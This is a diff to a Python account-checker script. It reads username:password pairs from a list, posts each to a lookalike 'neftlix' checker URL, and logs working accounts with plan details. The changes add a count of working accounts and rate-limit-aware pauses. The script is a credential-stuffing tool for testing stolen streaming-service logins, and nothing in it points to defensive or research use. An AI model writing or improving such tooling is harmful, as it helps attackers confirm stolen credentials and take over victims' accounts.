@@ -8,8 +8,9 @@ url = "https://checker.neftlix.ml/check-account"
 
 def main():
     parsed = 0
-    discarded = 0
+    invalid = 0
     count = 0
+    working = 0
     fileout = open(out_filename, "w")
 
     try:
@@ -26,12 +27,12 @@ def main():
         for line in tqdm.tqdm(rows, total=len(rows), unit="account"):
 
             if line.count("@") == 2 or line.count(":") > 1:
-                discarded += 1
+                invalid += 1
                 continue
             if count > 199:
                 count = 0
-                print("line {0} reached, count is {1}. Time to go bed!".format(rows, count))
-                time.sleep(60)
+                print("\nParsed: {0}\nInvalid accounts: {1}\nWorking accounts: {2}\nWaiting 60s...".format(parsed, invalid, working))
+                time.sleep(61)
 
             username, password = line.split(":")
             username_lowercase = username.lower()
@@ -46,11 +47,12 @@ def main():
             if data['working']:
                 fileout.write("username: {4}\tpass: {5}\tsuccess: {0}\tscreens: {1}\tlanguage: {2}\tworking: {3}\tuntil: {6}".format(data['success'], data['screens'],
                                                                                      data['language'], data['working'], username_lowercase, password, data['until']))
+                working += 1
 
             parsed += 1
             count += 1
 
-        print("rows parsed: " + str(parsed) + "\n" + "rows discarded: " + str(discarded))
+        print("rows parsed: " + str(parsed) + "\n" + "rows invalid: " + str(invalid))
         fileout.close()
 
     except IOError:
